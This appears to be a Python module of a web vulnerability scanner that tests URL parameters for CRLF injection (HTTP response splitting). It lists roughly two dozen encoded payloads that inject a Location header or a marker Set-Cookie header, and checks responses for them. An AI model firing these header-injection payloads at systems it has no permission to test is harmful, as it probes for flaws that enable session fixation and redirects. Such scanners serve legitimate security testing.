from core.others import good,bad,info,requester,proxies,requests,multitest
redirectCodes = [i for i in range(300,311,1)]
errorCodes = [error for error in range(400, 411, 1)]
payloads = [
            r"%0d%0aLocation:www.google.com%0d%0a",
            r"%0d%0aSet-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;",
            r"%E5%98%8A%E5%98%8DLocation:www.google.com",
            r"\rSet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\rSet-Cookie:name=ch33ms;",
            r"%u000ASet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            r"%23%0D%0ALocation:www.google.com;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;",
            r"%5cr%5cnLocation:www.google.com",
            r"%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:name=ch33ms;",
            r"\rSet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;"
            ]
#---------------------------------------------------------------------#
def crlfScan(url,foxy):
    global payloadIndexCounter
    payloadIndexCounter = 0

    paramUrlTuple = multitest(url,payloads)
    if type(paramUrlTuple) is tuple:
        for params in paramUrlTuple[0]:
            testingBreak = request(paramUrlTuple[1],foxy,params)
            payloadIndexCounter += 1
            if testingBreak:
                break
    else:
        for url in paramUrlTuple:
            testingBreak = request(url,foxy)
            payloadIndexCounter += 1
            if testingBreak:
                break

def request(URI,foxy,params=''):
    try:
        respOBJ = requester(URI,foxy,params)
    except requests.exceptions.Timeout:
        print("[\033[91mTimeout\033[00m] %s" % url)
        return True
    except requests.exceptions.ConnectionError:
        print("%s Connection Error" % bad)
        return True

    funcBreak = basicChecks(respOBJ,respOBJ.request.url)

def basicChecks(respOBJ,url):
    googles = ["https://www.google.com", "http://www.google.com", "google.com", "www.google.com"] 

    if respOBJ.headers.get('Location') in googles or respOBJ.headers.get(' Set-Cookie') == "name=ch33ms;":
        print("%s HTTP Response Splitting found" % good)
        print("%s Payload : %s" % (info, payloads[payloadIndexCounter]))

    elif respOBJ.status_code in errorCodes:
        print("%s %s [\033[91m%s\033[00m]" % (bad,url,respOBJ.status_code))

    else:
        print("%s Found nothing :: %s" % (bad,url))